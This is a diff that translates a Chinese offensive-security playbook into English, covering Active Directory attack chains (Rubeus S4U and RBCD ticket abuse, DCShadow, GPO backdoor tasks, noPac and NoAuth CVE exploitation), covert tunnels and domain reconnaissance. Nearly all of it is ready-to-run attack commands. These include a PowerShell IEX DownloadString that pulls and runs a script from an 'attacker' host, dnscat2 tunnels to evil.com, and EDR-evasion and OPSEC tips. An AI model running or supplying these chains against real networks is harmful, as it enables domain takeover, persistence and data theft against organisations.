+a BloodHound query
 ```
 
-**2. 获取服务票据**  _[windows]_
+**2. Obtain a service ticket**  _[windows]_
 _S4U2Self + S4U2Proxy_
 ```
 Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /rc4:HASH /msdsspn:CIFS/target.domain.com /impersonateuser:Administrator
-获取域管的服务票据
+Obtain a service ticket for the domain admin
 ```
 
-**3. 使用票据**  _[windows]_
-_注入票据_
+**3. Use the ticket**  _[windows]_
+_Inject the ticket_
 ```
 Rubeus.exe ptt /ticket:BASE64_TICKET
-注入票据并访问服务
+Inject the ticket and access the service
 ```
 
 ---
 
-### 基于资源的约束委派  `resource-delegation`
-利用RBCD进行权限提升
-子类：**委派攻击** · tags: `rbcd` `delegation` `kerberos`
+### Resource-Based Constrained Delegation  `resource-delegation`
+Exploit RBCD for privilege escalation
+Subclass: **Delegation Attack** · tags: `rbcd` `delegation` `kerberos`
 
-**前置条件：** 对目标对象有WriteDACL权限
+**Preconditions:** WriteDACL permission on the target object
 
-**攻击链：**
+**Attack chain:**
 
-**1. 创建机器账户**  _[windows]_
-_创建机器账户_
+**1. Create a machine account**  _[windows]_
+_Create a machine account_
 ```
 New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString "password" -AsPlainText -Force)
-创建新的机器账户
+Create a new machine account
 ```
 
-**2. 配置RBCD**  _[windows]_
-_配置RBCD_
+**2. Configure RBCD**  _[windows]_
+_Configure RBCD_
 ```
 Set-ADComputer -Identity TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$
-设置委派关系
+Set up the delegation relationship
 ```
 
-**3. 利用RBCD**  _[windows]_
-_利用RBCD_
+**3. Exploit RBCD**  _[windows]_
+_Exploit RBCD_
 ```
 Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/target.domain.com
-获取域管票据
+Obtain a domain admin ticket
 ```
 
 ---
 
-### DCShadow攻击  `dcshadow-attack`
-伪造域控制器注入数据
-子类：**DCShadow** · tags: `dcshadow` `domain` `injection`
+### DCShadow Attack  `dcshadow-attack`
+Impersonate a domain controller to inject data
+Subclass: **DCShadow** · tags: `dcshadow` `domain` `injection`
 
-**前置条件：** 域管理员权限；可注册新DC
+**Preconditions:** Domain admin privileges; ability to register a new DC
 
-**攻击链：**
+**Attack chain:**
 
-**1. 注册伪造DC**  _[windows]_
-_注册伪造DC_
+**1. Register a fake DC**  _[windows]_
+_Register a fake DC_
 ```
 mimikatz # lsadump::dcshadow /object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
-注册伪造DC并修改对象属性
+Register a fake DC and modify the object attribute
 ```
 
-**2. 推送更改**  _[windows]_
-_推送更改_
+**2. Push the changes**  _[windows]_
+_Push the changes_
 ```
-在另一个终端:
+In another terminal:
 mimikatz # lsadump::dcshadow /push
-推送更改到真实DC
+Push the changes to the real DC
 ```
 
-**3. 常见利用**  _[windows]_
-_常见利用场景_
+**3. Common exploitation**  _[windows]_
+_Common exploitation scenarios_
 ```
-修改用户组:
+Modify a user's group:
 /object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519
-添加SID History:
+Add SID History:
 /attribute:sidHistory /value:S-1-5-21-xxx-500
 ```
 
 ---
 
-### 组策略滥用  `group-policy-abuse`
-滥用组策略进行横向移动
-子类：**组策略** · tags: `gpo` `group-policy` `domain`
+### Group Policy Abuse  `group-policy-abuse`
+Abuse Group Policy for lateral movement
+Subclass: **Group Policy** · tags: `gpo` `group-policy` `domain`
 
-**前置条件：** GPO编辑权限
+**Preconditions:** GPO edit permission
 
-**攻击链：**
+**Attack chain:**
 
-**1. 查找可编辑GPO**  _[windows]_
-_查找可编辑GPO_
+**1. Find editable GPOs**  _[windows]_
+_Find editable GPOs_
 ```
 Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }
-查找Domain Users可编辑的GPO
+Find GPOs editable by Domain Users
 ```
 
-**2. 添加计划任务**  _[windows]_
-_添加计划任务_
+**2. Add a scheduled task**  _[windows]_
+_Add a scheduled task_
 ```
 New-GPOImmediateTask -TaskName "Backdoor" -Command "cmd.exe" -Arguments "/c calc.exe" -GPODisplayName "VULN_GPO"
-添加立即执行的计划任务
+Add a scheduled task that runs immediately
 ```
 
-**3. 添加注册表项**  _[windows]_
-_添加注册表启动项_
+**3. Add a registry entry**  _[windows]_
+_Add a registry startup entry_
 ```
 Set-GPPrefRegistryValue -Name "VULN_GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -Value "C:\backdoor.exe"
 ```
 
 ---
 
-### SAM The Admin攻击  `sam-the-admin`
-CVE-2021-42278/CVE-2021-42287域提权
-子类：**SAM The Admin** · tags: `ad` `cve-2021-42278` `privilege`
+### SAM The Admin Attack  `sam-the-admin`
+CVE-2021-42278/CVE-2021-42287 domain privilege escalation
+Subclass: **SAM The Admin** · tags: `ad` `cve-2021-42278` `privilege`
 
-**前置条件：** 域用户权限；域控制器存在漏洞
+**Preconditions:** Domain user privileges, domain controller vulnerable
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检测漏洞**  _[linux]_
-_检测漏洞_
+**1. Detect vulnerability**  _[linux]_
+_Detect vulnerability_
 ```
 python noPac.py domain.com/user:password -dc-ip DC_IP
-检测是否存在漏洞
+Check whether the vulnerability exists
 ```
 
-**2. 利用漏洞**  _[linux]_
-_获取域控权限_
+**2. Exploit vulnerability**  _[linux]_
+_Obtain domain controller privileges_
 ```
 python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
-获取SYSTEM Shell
+Obtain a SYSTEM shell
 ```
 
-**3. 执行命令**  _[linux]_
-_执行命令_
+**3. Run a command**  _[linux]_
+_Execute command_
 ```
 python noPac.py domain.com/user:password -dc-ip DC_IP -dc-host DC_NAME -command "whoami"
 ```
 
 ---
 
-### NoAuth攻击  `noauth`
-CVE-2022-33679 Kerberos认证绕过
-子类：**NoAuth** · tags: `ad` `cve-2022-33679` `kerberos`
+### NoAuth Attack  `noauth`
+CVE-2022-33679 Kerberos authentication bypass
+Subclass: **NoAuth** · tags: `ad` `cve-2022-33679` `kerberos`
 
-**前置条件：** 域用户权限；目标账户有RC4密钥
+**Preconditions:** Domain user privileges, target account has an RC4 key
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检测漏洞**  _[linux]_
-_检测漏洞_
+**1. Detect vulnerability**  _[linux]_
+_Detect vulnerability_
 ```
 python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
-检测是否存在漏洞
+Check whether the vulnerability exists
 ```
 
-**2. 利用漏洞**  _[linux]_
-_获取TGT_
+**2. Exploit vulnerability**  _[linux]_
+_Obtain TGT_
 ```
 python NoAuth.py domain.com/user:password -dc-ip DC_IP -target administrator
-获取目标用户TGT
+Obtain the target user's TGT
 ```
 
-**3. 使用TGT**  _[linux]_
-_使用获取的TGT_
+**3. Use the TGT**  _[linux]_
+_Use the obtained TGT_
 ```
-设置KRB5CCNAME环境变量
+Set the KRB5CCNAME environment variable
 export KRB5CCNAME=administrator.ccache
-使用psexec.py等工具
+Use tools such as psexec.py
 ```
 
 ---
 
-## 隧道代理
+## Tunnels and Proxies
 
-### FRP内网穿透  `tunnel-frp`
-使用FRP建立内网穿透隧道
-子类：**TCP隧道** · tags: `frp` `tunnel` `proxy` `nat`
+### FRP Internal Network Tunneling  `tunnel-frp`
+Use FRP to establish an internal network tunnel
+Subclass: **TCP Tunnel** · tags: `frp` `tunnel` `proxy` `nat`
 
-**前置条件：** 公网服务器；内网机器可访问公网；FRP工具
+**Preconditions:** Public server, internal machine can reach the public internet, FRP tool
 
-**攻击链：**
+**Attack chain:**
 
-**1. 服务端配置**  _[linux]_
-_FRP服务端配置文件frps.ini_
+**1. Server configuration**  _[linux]_
+_FRP server configuration file frps.ini_
 ```
 [common]
 bind_port = 7000
 ```
 
-**2. 客户端配置**  _[windows]_
-_FRP客户端配置文件frpc.ini_
+**2. Client configuration**  _[windows]_
+_FRP client configuration file frpc.ini_
 ```
 [common]
 server_addr = attacker_ip
@@ -3014,160 +3014,160 @@ local_port = 3389
 remote_port = 3389
 ```
 
-**3. 启动服务端**  _[linux]_
-_启动FRP服务端_
+**3. Start the server**  _[linux]_
+_Start the FRP server_
 ```
 ./frps -c frps.ini
 ```
 
-**4. 启动客户端**  _[windows]_
-_启动FRP客户端_
+**4. Start the client**  _[windows]_
+_Start the FRP client_
 ```
 frpc.exe -c frpc.ini
 ```
 
-**分析：** FRP可以建立TCP隧道，将内网服务映射到公网。
+**Analysis:** FRP can establish a TCP tunnel that maps internal network services to the public internet.
 
-**OPSEC：** FRP流量可能被检测；考虑使用加密传输；注意隐藏进程
+**OPSEC:** FRP traffic may be detected, consider using encrypted transport, be mindful of process hiding
 
 ---
 
-### Chisel内网穿透  `tunnel-chisel`
-使用Chisel建立内网穿透隧道
-子类：**HTTP隧道** · tags: `chisel` `tunnel` `proxy` `http`
+### Chisel Internal Network Tunneling  `tunnel-chisel`
+Use Chisel to establish an internal network tunnel
+Subclass: **HTTP Tunnel** · tags: `chisel` `tunnel` `proxy` `http`
 
-**前置条件：** 公网服务器；内网机器可访问公网；Chisel工具
+**Preconditions:** Public server, internal machine can reach the public internet, Chisel tool
 
-**攻击链：**
+**Attack chain:**
 
-**1. 服务端**  _[linux]_
-_启动Chisel服务端_
+**1. Server**  _[linux]_
+_Start the Chisel server_
 ```
 ./chisel server -p 8000 --reverse
 ```
 
-**2. 反向SOCKS**  _[windows]_
-_建立反向SOCKS代理_
+**2. Reverse SOCKS**  _[windows]_
+_Establish a reverse SOCKS proxy_
 ```
 chisel.exe client attacker_ip:8000 R:socks
 ```
 
-**3. 端口转发**  _[windows]_
-_端口转发_
+**3. Port forwarding**  _[windows]_
+_Port forwarding_
 ```
 chisel.exe client attacker_ip:8000 R:3389:127.0.0.1:3389
 ```
 
-**分析：** Chisel可以建立HTTP隧道，穿透防火墙。
+**Analysis:** Chisel can establish an HTTP tunnel to bypass firewalls.
 
-**OPSEC：** Chisel使用HTTP协议；可以绑定域名伪装；流量加密
+**OPSEC:** Chisel uses the HTTP protocol, can be disguised by binding a domain name, traffic is encrypted
 
 ---
 
-### ReGeorg隧道  `tunnel-regeorg`
-通过Web Shell建立隧道
-子类：**ReGeorg** · tags: `tunnel` `regeorg` `proxy`
+### ReGeorg Tunnel  `tunnel-regeorg`
+Establish a tunnel through a web shell
+Subclass: **ReGeorg** · tags: `tunnel` `regeorg` `proxy`
 
-**前置条件：** Web Shell上传；支持脚本语言
+**Preconditions:** Web shell uploaded, scripting language supported
 
-**攻击链：**
+**Attack chain:**
 
-**1. 上传隧道脚本**
-_上传对应语言的隧道脚本_
+**1. Upload the tunnel script**
+_Upload the tunnel script for the corresponding language_
 ```
-上传tunnel.aspx/tunnel.jsp/tunnel.php到目标Web服务器
+Upload tunnel.aspx/tunnel.jsp/tunnel.php to the target web server
 ```
 
-**2. 建立隧道**  _[linux]_
-_启动SOCKS代理_
+**2. Establish tunnel**  _[linux]_
+_Start SOCKS proxy_
 ```
 python reGeorgSocksProxy.py -p 1080 -u http://target/tunnel.aspx
 ```
 
-**3. 配置代理**  _[linux]_
-_通过代理扫描_
+**3. Configure proxy**  _[linux]_
+_Scan through the proxy_
 ```
 proxychains nmap -sT -Pn target
 ```
 
 ---
 
-### SSH本地转发  `tunnel-ssh-local`
-SSH本地端口转发
-子类：**SSH** · tags: `ssh` `tunnel` `local`
+### SSH Local Forwarding  `tunnel-ssh-local`
+SSH local port forwarding
+Subclass: **SSH** · tags: `ssh` `tunnel` `local`
 
-**前置条件：** SSH访问权限
+**Preconditions:** SSH access
 
-**攻击链：**
+**Attack chain:**
 
-**1. 本地转发**  _[linux]_
-_将目标80端口映射到本地8080_
+**1. Local forwarding**  _[linux]_
+_Map the target's port 80 to local port 8080_
 ```
 ssh -L 8080:target:80 user@jump
 ```
 
 ---
 
-### SSH远程转发  `tunnel-ssh-remote`
-SSH远程端口转发
-子类：**SSH** · tags: `ssh` `tunnel` `remote`
+### SSH Remote Forwarding  `tunnel-ssh-remote`
+SSH remote port forwarding
+Subclass: **SSH** · tags: `ssh` `tunnel` `remote`
 
-**前置条件：** SSH访问权限
+**Preconditions:** SSH access
 
-**攻击链：**
+**Attack chain:**
 
-**1. 远程转发**  _[linux]_
-_将本地80端口映射到远程8080_
+**1. Remote forwarding**  _[linux]_
+_Map local port 80 to remote port 8080_
 ```
 ssh -R 8080:localhost:80 user@jump
 ```
 
 ---
 
-### SSH动态转发  `tunnel-ssh-dynamic`
-SSH动态SOCKS代理
-子类：**SSH** · tags: `ssh` `tunnel` `socks`
+### SSH Dynamic Forwarding  `tunnel-ssh-dynamic`
+SSH dynamic SOCKS proxy
+Subclass: **SSH** · tags: `ssh` `tunnel` `socks`
 
-**前置条件：** SSH访问权限
+**Preconditions:** SSH access
 
-**攻击链：**
+**Attack chain:**
 
-**1. 动态转发**  _[linux]_
-_创建SOCKS代理_
+**1. Dynamic forwarding**  _[linux]_
+_Create a SOCKS proxy_
 ```
 ssh -D 1080 user@jump
 ```
 
-**2. 使用代理**  _[linux]_
-_通过SOCKS代理访问_
+**2. Use the proxy**  _[linux]_
+_Access through the SOCKS proxy_
 ```
 proxychains nmap -sT -Pn target
 ```
 
 ---
 
-### DNS隧道  `tunnel-dns`
-通过DNS协议建立隧道
-子类：**DNS** · tags: `dns` `tunnel` `covert`
+### DNS Tunnel  `tunnel-dns`
+Establish a tunnel over the DNS protocol
+Subclass: **DNS** · tags: `dns` `tunnel` `covert`
 
-**前置条件：** DNS解析权限；可控域名
+**Preconditions:** DNS resolution privileges, controllable domain name
 
-**攻击链：**
+**Attack chain:**
 
-**1. 使用dnscat2**  _[linux]_
-_启动dnscat2服务器_
+**1. Use dnscat2**  _[linux]_
+_Start the dnscat2 server_
 ```
 ruby dnscat2.rb evil.com --dns port=53,domain=evil.com
 ```
 
-**2. 客户端连接**  _[windows]_
-_客户端连接到服务器_
+**2. Client connection**  _[windows]_
+_Client connects to the server_
 ```
 dnscat2-v0.07-client-win32.exe --dns domain=evil.com --secret SECRET
 ```
 
-**3. 建立隧道**  _[linux]_
-_建立SOCKS隧道_
+**3. Establish tunnel**  _[linux]_
+_Establish a SOCKS tunnel_
 ```
 session -i 1
 listen 127.0.0.1:1080 10.0.0.1:1080
@@ -3175,50 +3175,50 @@ listen 127.0.0.1:1080 10.0.0.1:1080
 
 ---
 
-### ICMP隧道  `tunnel-icmp`
-通过ICMP协议建立隧道
-子类：**ICMP** · tags: `icmp` `tunnel` `covert`
+### ICMP Tunnel  `tunnel-icmp`
+Establish a tunnel over the ICMP protocol
+Subclass: **ICMP** · tags: `icmp` `tunnel` `covert`
 
-**前置条件：** ICMP允许通过；管理员权限
+**Preconditions:** ICMP allowed through, administrator privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 使用icmptunnel**  _[linux]_
-_服务端启动_
+**1. Use icmptunnel**  _[linux]_
+_Start the server side_
 ```
 icmptunnel -s 10.0.0.1
 ```
 
-**2. 客户端连接**  _[linux]_
-_客户端连接_
+**2. Client connection**  _[linux]_
+_Client connects_
 ```
 icmptunnel -c attacker.com
 ```
 
 ---
 
-### Ligolo隧道  `tunnel-ligolo`
-Ligolo内网穿透工具
-子类：**Ligolo** · tags: `ligolo` `tunnel` `proxy`
+### Ligolo Tunnel  `tunnel-ligolo`
+Ligolo internal network tunneling tool
+Subclass: **Ligolo** · tags: `ligolo` `tunnel` `proxy`
 
-**前置条件：** 可执行代理程序
+**Preconditions:** Proxy program executable
 
-**攻击链：**
+**Attack chain:**
 
-**1. 启动服务端**  _[linux]_
-_启动Ligolo代理服务_
+**1. Start the server**  _[linux]_
+_Start the Ligolo proxy service_
 ```
 sudo proxy -selfcert
 ```
 
-**2. 运行代理**  _[windows]_
-_目标机器运行代理_
+**2. Run the proxy**  _[windows]_
+_Run the proxy on the target machine_
 ```
 agent.exe -connect attacker:11601 -ignore-cert
 ```
 
-**3. 创建隧道**  _[linux]_
-_创建隧道接口_
+**3. Create tunnel**  _[linux]_
+_Create the tunnel interface_
 ```
 session
 start
@@ -3226,42 +3226,42 @@ start
 
 ---
 
-### SOCKS代理  `socks-proxy`
-建立SOCKS代理访问内网
-子类：**SOCKS** · tags: `socks` `proxy` `tunnel`
+### SOCKS Proxy  `socks-proxy`
+Establish a SOCKS proxy to access the internal network
+Subclass: **SOCKS** · tags: `socks` `proxy` `tunnel`
 
-**前置条件：** 已有内网访问点
+**Preconditions:** Existing internal network access point
 
-**攻击链：**
+**Attack chain:**
 
-**1. SSH SOCKS代理**  _[linux]_
-_SSH动态端口转发_
+**1. SSH SOCKS proxy**  _[linux]_
+_SSH dynamic port forwarding_
 ```
 ssh -D 1080 user@jumpserver
-或
+or
 ssh -D 1080 -N -f user@jumpserver
 ```
 
-**2. ProxyChains配置**  _[linux]_
-_配置ProxyChains_
+**2. ProxyChains configuration**  _[linux]_
+_Configure ProxyChains_
 ```
-编辑 /etc/proxychains.conf:
+Edit /etc/proxychains.conf:
 [ProxyList]
 socks5 127.0.0.1 1080
 
-使用:
+Use:
 proxychains nmap -sT target
 ```
 
 **3. Cobalt Strike SOCKS**  _[windows]_
-_CS SOCKS代理_
+_CS SOCKS proxy_
 ```
 beacon> socks 1080
-在CS中启动SOCKS代理
+Start the SOCKS proxy in CS
 ```
 
 **4. Metasploit SOCKS**  _[linux]_
-_MSF SOCKS代理_
+_MSF SOCKS proxy_
 ```
 use auxiliary/server/socks_proxy
 set SRVPORT 1080
@@ -3271,978 +3271,978 @@ run
 
 ---
 
-### Ngrok内网穿透  `tunnel-ngrok`
-使用Ngrok建立内网穿透
-子类：**Ngrok** · tags: `ngrok` `tunnel` `penetration`
+### Ngrok Internal Network Tunneling  `tunnel-ngrok`
+Use Ngrok to establish an internal network tunnel
+Subclass: **Ngrok** · tags: `ngrok` `tunnel` `penetration`
 
-**前置条件：** Ngrok账号；可访问外网
+**Preconditions:** Ngrok account, external network access
 
-**攻击链：**
+**Attack chain:**
 
-**1. 安装Ngrok**
-_安装并配置Ngrok_
+**1. Install Ngrok**
+_Install and configure Ngrok_
 ```
-下载: https://ngrok.com/download
+Download: https://ngrok.com/download
 tar -xvzf ngrok.zip
 ./ngrok authtoken YOUR_TOKEN
 ```
 
-**2. HTTP隧道**
-_创建HTTP隧道_
+**2. HTTP tunnel**
+_Create an HTTP tunnel_
 ```
 ./ngrok http 80
-将本地80端口映射到公网
+Map local port 80 to the public internet
 ```
 
-**3. TCP隧道**
-_创建TCP隧道_
+**3. TCP tunnel**
+_Create a TCP tunnel_
 ```
 ./ngrok tcp 3389
-将本地3389端口映射到公网
+Map local port 3389 to the public internet
 ```
 
-**4. 自定义域名**
-_使用自定义域名_
+**4. Custom domain**
+_Use a custom domain_
 ```
 ./ngrok http -hostname=custom.domain.com 80
 ```
 
 ---
 
-### EW内网穿透  `tunnel-ew`
-使用EW建立内网穿透
-子类：**EW** · tags: `ew` `tunnel` `socks`
+### EW Internal Network Tunneling  `tunnel-ew`
+Use EW to establish an internal network tunnel
+Subclass: **EW** · tags: `ew` `tunnel` `socks`
 
-**前置条件：** 已有内网访问点
+**Preconditions:** Existing internal network access point
 
-**攻击链：**
+**Attack chain:**
 
-**1. 正向代理**  _[linux]_
-_正向SOCKS代理_
+**1. Forward proxy**  _[linux]_
+_Forward SOCKS proxy_
 ```
 ./ew -s ssocksd -l 1080
-在跳板机上启动SOCKS代理
+Start the SOCKS proxy on the pivot host
 ```
 
-**2. 反向代理**  _[linux]_
-_反向SOCKS代理_
+**2. Reverse proxy**  _[linux]_
+_Reverse SOCKS proxy_
 ```
-攻击机: ./ew -s rcsocks -l 1080 -e 8888
-跳板机: ./ew -s rssocks -d attacker_ip -e 8888
+Attacker machine: ./ew -s rcsocks -l 1080 -e 8888
+Pivot host: ./ew -s rssocks -d attacker_ip -e 8888
 ```
 
-**3. 多级级联**  _[linux]_
-_多级级联_
+**3. Multi-hop chaining**  _[linux]_
+_Multi-hop chaining_
 ```
 ./ew -s lcx_tran -l 1080 -f 2nd_hop -g 9999
-多级跳板穿透
+Multi-hop pivot tunneling
 ```
 
 ---
 
-### Venom内网穿透  `tunnel-venom`
-使用Venom建立内网穿透
-子类：**Venom** · tags: `venom` `tunnel` `socks`
+### Venom Internal Network Tunneling  `tunnel-venom`
+Use Venom to establish an internal network tunnel
+Subclass: **Venom** · tags: `venom` `tunnel` `socks`
 
-**前置条件：** 已有内网访问点
+**Preconditions:** Existing internal network access point
 
-**攻击链：**
+**Attack chain:**
 
-**1. 启动服务端**  _[linux]_
-_启动服务端_
+**1. Start the server**  _[linux]_
+_Start the server_
 ```
 ./venom_server -lport 9999
-在攻击机启动服务端
+Start the server on the attacker machine
 ```
 
-**2. 连接客户端**
-_连接服务端_
+**2. Connect the client**
+_Connect to the server_
 ```
 ./venom_client -rhost attacker_ip -rport 9999
-在跳板机连接服务端
+Connect to the server from the pivot host
 ```
 
-**3. 建立SOCKS**
-_建立SOCKS代理_
+**3. Establish SOCKS**
+_Establish a SOCKS proxy_
 ```
 Venom > socks 1080
-建立SOCKS代理
+Establish a SOCKS proxy
 ```
 
-**4. 端口转发**
-_端口转发_
+**4. Port forwarding**
+_Port forwarding_
 ```
 Venom > lforward 127.0.0.1 3389 13389
-将内网3389转发到本地13389
+Forward internal network port 3389 to local port 13389
 ```
 
 ---
 
-## 信息收集
+## Information Gathering
 
-### BloodHound域分析  `bloodhound-enumeration`
-使用BloodHound分析Active Directory攻击路径
-子类：**域分析** · tags: `bloodhound` `active-directory` `enumeration` `neo4j`
+### BloodHound Domain Analysis  `bloodhound-enumeration`
+Use BloodHound to analyze Active Directory attack paths
+Subclass: **Domain Analysis** · tags: `bloodhound` `active-directory` `enumeration` `neo4j`
 
-**前置条件：** 域环境；域用户凭证；BloodHound工具
+**Preconditions:** domain environment; domain user credentials; BloodHound tool
 
-**攻击链：**
+**Attack chain:**
 
-**1. SharpHound采集**  _[windows]_
-_使用SharpHound采集域信息_
+**1. SharpHound Collection**  _[windows]_
+_Use SharpHound to collect domain information_
 ```
 SharpHound.exe -c All
 ```
 
-**2. PowerShell采集**  _[windows]_
-_通过PowerShell远程加载采集_
+**2. PowerShell Collection**  _[windows]_
+_Remotely load and collect via PowerShell_
 ```
 IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All
 ```
 
 **3. bloodhound-python**  _[linux]_
-_使用Python版本采集_
+_Use the Python version to collect_
 ```
 bloodhound-python -u user -p password -d target.com -ns dc_ip
 ```
 
-**4. 指定域控制器**  _[windows]_
-_指定域控制器采集_
+**4. Specify Domain Controller**  _[windows]_
+_Collect against a specified domain controller_
 ```
 SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.target.com
 ```
 
-**5. 启动Neo4j**  _[linux]_
-_启动Neo4j数据库_
+**5. Start Neo4j**  _[linux]_
+_Start the Neo4j database_
 ```
 sudo neo4j console
 ```
 
-**6. Cypher查询域管**
-_查询域管理员用户_
+**6. Cypher Query for Domain Admins**
+_Query domain admin users_
 ```
 MATCH (n:User) WHERE n.admincount=true RETURN n
 ```
 
-**7. 查询攻击路径**
-_查询到域管理员的最短路径_
+**7. Query Attack Paths**
+_Query the shortest path to domain admin_
 ```
 MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. 隐蔽采集**
-_随机化文件名避免检测_
+**1. Stealth Collection**
+_Randomize the filename to avoid detection_
 ```
 SharpHound.exe -c All --LdapUsername user --LdapPassword pass --OutputDirectory C:\Users\Public --RandomizeFilenames
 ```
 
-**分析：** BloodHound可发现域内的攻击路径，如权限提升路径、会话信息、组关系等。
+**Analysis:** BloodHound can uncover attack paths within the domain, such as privilege escalation paths, session information, and group relationships.
 
-**OPSEC：** BloodHound采集会产生大量LDAP查询；可能触发域控制器告警；建议在非工作时间执行
+**OPSEC:** BloodHound collection generates a large volume of LDAP queries; it may trigger domain controller alerts; recommended to run outside business hours
 
 ---
 
-### SPN扫描  `spn-scan`
-扫描域内服务主体名称
-子类：**SPN** · tags: `spn` `kerberos` `enumeration`
+### SPN Scan  `spn-scan`
+Scan for Service Principal Names within the domain
+Subclass: **SPN** · tags: `spn` `kerberos` `enumeration`
 
-**前置条件：** 域环境；任意域用户凭证
+**Preconditions:** a domain environment; any domain user credential
 
-**攻击链：**
+**Attack chain:**
 
-**1. 查询所有SPN**  _[windows]_
-_查询域内所有SPN_
+**1. Query All SPNs**  _[windows]_
+_Query every SPN in the domain_
 ```
 setspn -T domain.com -Q */*
 ```
 
-**2. PowerShell查询**  _[windows]_
-_PowerShell查询SPN用户_
+**2. PowerShell Query**  _[windows]_
+_Query SPN accounts via PowerShell_
 ```
 Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
 ```
 
-**3. Impacket查询**  _[linux]_
-_Impacket查询SPN_
+**3. Impacket Query**  _[linux]_
+_Query SPNs via Impacket_
 ```
 GetUserSPNs.py domain/user:password -dc-ip dc_ip
 ```
 
-**4. 查询特定服务**  _[windows]_
-_查询HTTP服务的SPN_
+**4. Query a Specific Service**  _[windows]_
+_Query the SPN of the HTTP service_
 ```
 setspn -T domain.com -Q HTTP/*
 ```
 
-**5. 查找SQL服务**  _[windows]_
-_查询MSSQL服务的SPN_
+**5. Find SQL Services**  _[windows]_
+_Query the SPN of the MSSQL service_
 ```
 setspn -T domain.com -Q MSSQLSvc/*
 ```
 
-**分析：** SPN扫描可以发现域内运行的服务账户，为Kerberoasting攻击做准备。
+**Analysis:** SPN scanning can reveal service accounts running within the domain, preparing the ground for a Kerberoasting attack.
 
-**OPSEC：** SPN查询是正常的域操作；不会触发明显告警；可用于后续Kerberoasting攻击
+**OPSEC:** SPN queries are normal domain operations; they will not trigger obvious alerts; can be used to prepare for subsequent Kerberoasting attacks
 
 ---
 
-### 内网端口扫描  `port-scan`
-内网端口扫描与服务识别
-子类：**端口扫描** · tags: `nmap` `port-scan` `enumeration`
+### Internal Network Port Scan  `port-scan`
+Internal network port scanning and service identification
+Subclass: **Port Scan** · tags: `nmap` `port-scan` `enumeration`
 
-**前置条件：** 内网访问权限；扫描工具
+**Preconditions:** internal network access; scanning tools
 
-**攻击链：**
+**Attack chain:**
 
-**1. 快速扫描**  _[linux]_
-_快速扫描常用端口_
+**1. Quick Scan**  _[linux]_
+_Quickly scan common ports_
 ```
 nmap -sS -T4 -F 192.168.1.0/24
 ```
 
-**2. 全端口扫描**  _[linux]_
-_扫描所有65535端口_
+**2. Full Port Scan**  _[linux]_
+_Scan all 65535 ports_
 ```
 nmap -sS -p- 192.168.1.1
 ```
 
-**3. 服务识别**  _[linux]_
-_服务版本探测和脚本扫描_
+**3. Service Identification**  _[linux]_
+_Service version detection and script scanning_
 ```
 nmap -sV -sC 192.168.1.1
 ```
 
-**4. 内网存活探测**  _[linux]_
-_Ping扫描发现存活主机_
+**4. Internal Host Discovery**  _[linux]_
+_Ping scan to discover live hosts_
 ```
 nmap -sn 192.168.1.0/24
 ```
 
-**5. Masscan快速扫描**  _[linux]_
-_高速端口扫描_
+**5. Masscan Fast Scan**  _[linux]_
+_High-speed port scanning_
 ```
 masscan -p1-65535 192.168.1.0/24 --rate=1000
 ```
 
-**6. 操作系统识别**  _[linux]_
-_识别目标操作系统_
+**6. Operating System Identification**  _[linux]_
+_Identify the target operating system_
 ```
 nmap -O 192.168.1.1
 ```
 
-**7. UDP扫描**  _[linux]_
-_扫描常用UDP端口_
+**7. UDP Scan**  _[linux]_
+_Scan common UDP ports_
 ```
 nmap -sU --top-ports 20 192.168.1.1
 ```
 
-**8. 漏洞扫描**  _[linux]_
-_使用漏洞扫描脚本_
+**8. Vulnerability Scan**  _[linux]_
+_Use vulnerability scanning scripts_
 ```
 nmap --script vuln 192.168.1.1
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. 隐蔽扫描**
-_低速分片扫描，添加随机数据_
+**1. Stealth Scan**
+_Low-speed fragmented scan with random data padding_
 ```
 nmap -sS -T2 -f --data-length 50 192.168.1.1
 ```
 
-**2. 诱饵扫描**
-_使用诱饵IP混淆扫描来源_
+**2. Decoy Scan**
+_Use decoy IPs to obscure the scan source_
 ```
 nmap -sS -D RND:10 192.168.1.1
 ```
 
-**分析：** 端口扫描可以发现内网中开放的服务，识别潜在的攻击目标。
+**Analysis:** Port scanning can reveal services open on the internal network and identify potential attack targets.
 
-**OPSEC：** 高速扫描可能触发IDS告警；建议使用较低速率；分时段进行扫描
+**OPSEC:** High-speed scanning may trigger IDS alerts; recommended to use a lower rate; spread the scan across multiple time windows
 
 ---
 
-### 域信息收集  `domain-recon`
-Active Directory域环境信息收集
-子类：**域信息** · tags: `active-directory` `domain` `enumeration`
+### Domain Information Gathering  `domain-recon`
+Active Directory domain environment information gathering
+Subclass: **Domain Information** · tags: `active-directory` `domain` `enumeration`
 
-**前置条件：** 域环境；任意域用户凭证
+**Preconditions:** a domain environment; any domain user credential
 
-**攻击链：**
+**Attack chain:**
 
-**1. 域信息**  _[windows]_
-_获取域信息_
+**1. Domain Information**  _[windows]_
+_Get domain information_
 ```
 net config workstation
 ```
 
-**2. 域控制器**  _[windows]_
-_列出域控制器_
+**2. Domain Controller**  _[windows]_
+_List domain controllers_
 ```
 nltest /dclist:domain.com
 ```
 
-**3. 域用户**  _[windows]_
-_列出域用户_
